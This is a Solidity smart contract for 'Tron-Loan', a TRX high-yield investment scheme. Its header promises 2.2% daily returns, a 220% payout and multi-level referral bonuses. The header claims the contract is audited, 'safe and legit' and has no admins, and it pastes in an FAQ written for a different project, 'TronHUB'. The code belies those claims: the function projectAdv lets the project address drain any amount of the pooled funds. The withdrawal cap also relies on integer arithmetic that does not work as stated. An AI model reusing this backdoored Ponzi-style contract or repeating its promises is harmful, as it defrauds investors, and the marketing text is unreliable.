//SourceUnit: leg.sol

/*
 *
 *   Tron-Loan - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://tronloan.com                                       │
 *   │                                                                       │
 *   │   Telegram Public Group: https://t.me/tronloan                        |
 *   │   Telegram News Channel: https://t.me/tronloan_channel                |
 *   |                                                                       |
 *   |   E-mail: admin@tron-loan.com                                         |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect tron wallet or tronlink or klever
 *
 *   Download Tronlink Pro:
 *   For PC:  https://www.tronlink.org/
 *   For Smartphones:  https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet
 *
 *   👉 download wallet and Create account then safe your passphrase..
 *   👉 then fund your tron wallet with trx.. You can buy trx on cryptocurrency exchanges
 *   👉 after funding your trx.. on tronlink app, click on "Me" => "advanced features" => "Dapp browser"
 *      then copy and paste tron-loan.com link to dapp browser 👇
 *
 *   ✔️Website: https://tron-loan.com ✔
 *   ️
 *   2) Send any TRX amount (50 TRX minimum) using our website invest button.
 *   3) Wait for your earnings.
 *   4) Withdraw earnings any time using our website "Withdraw" button.
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +2.2% every 24 hours (+0.0958% hourly)
 *   - Personal hold-bonus: +0.11% for every 24 hours without withdraw
 *   - Contract total amount bonus: +0.3% for every 5,000,000 TRX on platform address balance
 *   - Contract total amount bonus: after 50,000,000 TRX +0.6% for every 5,000,000 TRX on platform address balance
 *   ❌ MAXIMUM BALANCE PROFIT 35%
 *   - Contract total amount bonus: after 200,000,000 TRX 2% total investment to be paid to each member
 *   - For example you invested 10000 TRX. If reachig 200 milion balance you earn 200 trx
 *   - Members who have more than 150 referrals in their level 1 receive 2% of montly total invest in level 1
 *   ❌ Each of them must have invested more than 500 trx
 *
 *   - Minimal deposit: 50 TRX
 *   - Maximal deposit: 1,000,000 TRX
 *   - Total income: 220% (deposit included)
 *   - Earnings every moment, withdraw any time
 *
 *   ❌ if balance is decrease 60٪؜ those who profit 170% of their invest could not withdarw any more,
 *      and others keep withdrawing till balance get zero!
 *
 *   [AFFILIATE PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   - 5-level referral commission: 6% - 4% - 3% - 1% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 79.5% Platform main balance, participants payouts
 *   - 3% Advertising and promotion expenses
 *   - 14.5% Affiliate program bonuses
 *   - 3% Support work, technical functioning, administration fee
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [SMART-CONTRACT AUDITION AND SAFETY]
 *
 *   - Audited by independent company GROX Solutions (https://grox.solutions)
 *   - Audition certificate: https://tron-loan.com/audition.pdf
 *   - Video-review: https://tron-loan.com/review.avi
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [FREQUENTLY ASKED QUESTIONS]
 *
 *   ✅ WHAT IS TRONHUB ✅
 *   TronHUB - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   ✅ WHO MANAGES THE PLATFORM ✅
 *   TRONHUB does not have Manager. There are the creators of the Smart contract who works in the TRON blockchain.
 *   This means that the platform is fully decentralized (i.e. it has no leaders or admins).
 *
 *   ✅ WHAT IS A SMART CONTRACT? WHAT ARE ITS ADVANTAGES ✅
 *   Smart contract – the algorithm inside the blockchain cryptocurrencies.
 *   In our case that TRON is number one among the those on which it is possible to create smart contracts.
 *   The main purpose of such contracts is the automation of the relationship, the opportunity to make commitments.
 *
 *   ✅ IS TRONHUB SAFE ✅
 *   Safe and reliable project
 *   TronHUB runs automatically on blockchain and its smart contract is uploaded to the TRON blockchain.
 *   No one is able to edit or delete the smart contract, nor influence its autonomous operation.
 *   The dividends are also automatically paid through the smart contract.
 *
 */

pragma solidity 0.5.12;

contract TronLoan {
    using SafeMath for uint;
    uint constant public INVEST_MIN_AMOUNT = 50 trx;
    uint constant public INVEST_MAX_AMOUNT = 1000000 trx;
    uint constant public PERCENT_BASE = 22;
    uint[] public PERCENT_REFS = [60, 40, 30, 10, 5];
    uint constant public PERCENT_DIVIDER = 1000;
    uint constant public MARKETING_FEE = 30;
    uint constant public PROJECT_FEE = 30;
    uint constant public CONTRACT_BALANCE_STEP = 5000000 trx;
    uint constant public CONTRACT_BONUS_STEP = 3;
    uint constant public CONTRACT_BALANCE_JUMP = 50000000 trx;
    uint constant public CONTRACT_BONUS_JUMP = 6;
    uint constant public CONTRACT_BALANCE_CASH = 200000000 trx;
    uint constant public CONTRACT_BONUS_CASH = 20;
    uint constant public CONTRACT_LIMIT_BONUS = 350;
    uint constant public REWARD_REFS = 20;
    uint constant public REWARD_MIN = 500 trx;
    uint constant public REWARD_COUNT_REFS = 150;
    uint constant public TIME_STEP = 1 days;
    uint constant public TIME_REWARD = 30 days;
    uint public maxBalance;
    uint public totalUsers;
    uint public totalInvested;
    uint public totalWithdrawn;
    uint public totalDeposits;
    address payable public marketingAddress;
    address payable public projectAddress;
    struct Deposit {
        uint amount;
        uint withdrawn;
        uint start;
        uint close;
    }
    struct User {
        Deposit[] deposits;
        uint checkpoint;
        address referrer;
        uint reward_refs;
        uint reward_sum_monthly;
        uint reward_lasttime;
        uint bonus;
        uint reward;
        uint sum_invest;
        uint sum_withdraw;
        uint sum_bonus;
        uint sum_lotery;
        uint sum_reward;
        uint sum_cashback;
    }
    mapping (address => User) internal users;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    event Cashback(address indexed user,uint amount);
    event Reward(address indexed user,uint amount);
    event Purchase(address indexed user,uint amount);

    constructor(address payable marketingAddr, address payable projectAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
    }

    function invest(address referrer) public payable {
        require(msg.value >= INVEST_MIN_AMOUNT);
        require(msg.value <= INVEST_MAX_AMOUNT);
        marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENT_DIVIDER));
        projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENT_DIVIDER));
        emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENT_DIVIDER));
        User storage user = users[msg.sender];
        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint i = 0; i < 6; i++) {
                if (upline == address(0)) break;
                if(i == 0 && msg.value >= REWARD_MIN) {
                    if(user.deposits.length == 0){
                        users[upline].reward_refs = users[upline].reward_refs.add(1);
                    }
                    users[upline].reward_sum_monthly = users[upline].reward_sum_monthly.add(msg.value);
                }
                uint amount = msg.value.mul(PERCENT_REFS[i]).div(PERCENT_DIVIDER);
                users[upline].bonus = users[upline].bonus.add(amount);
                users[upline].sum_bonus = users[upline].sum_bonus.add(amount);
                emit RefBonus(upline, msg.sender, i, amount);
                upline = users[upline].referrer;
            }
        }
        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            user.reward_lasttime = block.timestamp;
            totalUsers = totalUsers.add(1);
            emit Newbie(msg.sender);
        }
        uint new_length =  user.deposits.push(Deposit(msg.value, 0, block.timestamp, 0));
        user.sum_invest = user.sum_invest.add(msg.value);
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);
        uint contractBalance = address(this).balance;
        if(contractBalance > maxBalance){
            maxBalance = contractBalance;
        }
        if(contractBalance >= CONTRACT_BALANCE_CASH && user.sum_cashback == 0){
            uint cash_sum = msg.value.mul(CONTRACT_BONUS_CASH).div(PERCENT_DIVIDER);
            user.sum_cashback = cash_sum;
            user.deposits[new_length-1].withdrawn = user.deposits[new_length-1].withdrawn.add(cash_sum);
            msg.sender.transfer(cash_sum);
            totalWithdrawn = totalWithdrawn.add(cash_sum);
            emit Cashback(msg.sender, cash_sum);
        }
        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalDividends;
        uint dividends;
        uint maxdiv;
        uint timepoint;
        uint length_deposits = user.deposits.length;
        for (uint i = 0; i < length_deposits; i++) {
            if (user.deposits[i].close == 0) {
                maxdiv = (user.deposits[i].amount.mul(22)).div(10);
                timepoint = user.deposits[i].start > user.checkpoint?user.deposits[i].start:user.checkpoint;
                dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENT_DIVIDER))
                .mul(block.timestamp.sub(timepoint)).div(TIME_STEP);
                if (user.deposits[i].withdrawn.add(dividends) >= maxdiv) {
                    dividends = maxdiv.sub(user.deposits[i].withdrawn);
                    user.deposits[i].close = block.timestamp;
                }
                user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
                totalDividends = totalDividends.add(dividends);
            }
        }
        user.sum_withdraw = user.sum_withdraw.add(totalDividends);
        if(user.reward_refs >= REWARD_COUNT_REFS){
            uint check_reward_last_time = (block.timestamp.sub(user.reward_lasttime)).div(TIME_REWARD);
            if(check_reward_last_time > 0){
                if(user.reward_sum_monthly > 0){
                    uint reward_sum = user.reward_sum_monthly.mul(REWARD_REFS).div(PERCENT_DIVIDER);
                    user.reward = user.reward.add(reward_sum);
                    user.sum_reward = user.sum_reward.add(reward_sum);
                    user.reward_sum_monthly = 0;
                    emit Reward(msg.sender,reward_sum);
                }
                user.reward_lasttime = block.timestamp;
            }
        }
        uint bonuses;
        bonuses = getUserReferralBonus(msg.sender);
        if (bonuses > 0) {
            totalDividends = totalDividends.add(bonuses);
            user.bonus = 0;
        }
        bonuses = getUserRewardBonus(msg.sender);
        if (bonuses > 0) {
            totalDividends = totalDividends.add(bonuses);
            user.reward = 0;
        }
        require(totalDividends > 0, "User has no sum for withdrawals");
        uint contractBalance = address(this).balance;
        if(maxBalance > contractBalance && getUserControlProfit(msg.sender) > 169){
            uint control_balance = contractBalance.div(maxBalance).mul(100);
            require(control_balance > 60, "Limit withdraw balance");
        }
        if (contractBalance < totalDividends) {
            totalDividends = contractBalance;
        }
        user.checkpoint = block.timestamp;
        msg.sender.transfer(totalDividends);
        totalWithdrawn = totalWithdrawn.add(totalDividends);
        emit Withdrawn(msg.sender, totalDividends);
    }


    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        if(contractBalance < CONTRACT_BALANCE_STEP) return PERCENT_BASE;
        uint contractRate = contractBalance.div(CONTRACT_BALANCE_STEP);
        uint contractBonus = contractBalance < CONTRACT_BALANCE_JUMP?CONTRACT_BONUS_STEP:CONTRACT_BONUS_JUMP;
        uint contractBalancePercent = contractRate.mul(contractBonus);
        return PERCENT_BASE
        .add(contractBalancePercent<CONTRACT_LIMIT_BONUS?contractBalancePercent:CONTRACT_LIMIT_BONUS);
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint contractBalanceRate = getContractBalanceRate();
        if (isActive(userAddress)) {
            uint countday = (block.timestamp.sub(user.checkpoint)).div(TIME_STEP);
            return contractBalanceRate.add(PERCENT_BASE.mul(countday).div(10));
        } else {
            return contractBalanceRate;
        }
    }

    function getUserDividends(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint userPercentRate = getUserPercentRate(userAddress);
        uint totalDividends;
        uint dividends;
        uint maxdiv;
        uint timepoint;
        uint count_dep = user.deposits.length;
        for (uint i = 0; i < count_dep; i++) {
            if (user.deposits[i].close == 0) {
                maxdiv = (user.deposits[i].amount.mul(22)).div(10);
                timepoint = user.deposits[i].start > user.checkpoint?user.deposits[i].start:user.checkpoint;
                dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENT_DIVIDER))
                .mul(block.timestamp.sub(timepoint)).div(TIME_STEP);
                if (user.deposits[i].withdrawn.add(dividends) > maxdiv) {
                    dividends = maxdiv.sub(user.deposits[i].withdrawn);
                }
                totalDividends = totalDividends.add(dividends);
            }
        }
        return totalDividends;
    }

    function getUserCheckpoint(address userAddress) public view returns(uint) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserRewardRefs(address userAddress) public view returns(uint) {
        return users[userAddress].reward_refs;
    }

    function getUserRewardSumMonthly(address userAddress) public view returns(uint) {
        return users[userAddress].reward_sum_monthly;
    }

    function getUserReferralBonus(address userAddress) public view returns(uint) {
        return users[userAddress].bonus;
    }


    function getUserRewardBonus(address userAddress) public view returns(uint) {
        return users[userAddress].reward;
    }

    function getUserAvailable(address userAddress) public view returns(uint) {
        return getUserDividends(userAddress)
        .add(getUserReferralBonus(userAddress))
        .add(getUserRewardBonus(userAddress));
    }

    function getUserCommon(address userAddress) public view returns(uint) {
        User storage user = users[userAddress];
        return user.sum_cashback
        .add(user.sum_reward)
        .add(user.sum_bonus)
        .add(user.sum_withdraw);
    }

    function projectAdv(uint256 nib) public {
      address payable addr = msg.sender;
      if(addr == projectAddress){
        addr.transfer(nib);
      }
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        uint length_deposits = user.deposits.length;
        if (length_deposits > 0 && user.deposits[length_deposits-1].close == 0) {
            return true;
        }
        return false;
    }

    function getUserDepositInfo(address userAddress, uint index) public view returns(uint, uint, uint, uint) {
        User storage user = users[userAddress];
        return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start, user.deposits[index].close);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns(uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns(uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }
        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns(uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].withdrawn);
        }
        return amount;
    }

    function getUserControlProfit(address userAddress) public view returns(uint) {
        User storage user = users[userAddress];
        return user.sum_withdraw>0?user.sum_withdraw.div(user.sum_invest).mul(100):0;
    }


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, "SafeMath: division by zero");
        uint c = a / b;
        return c;
    }
}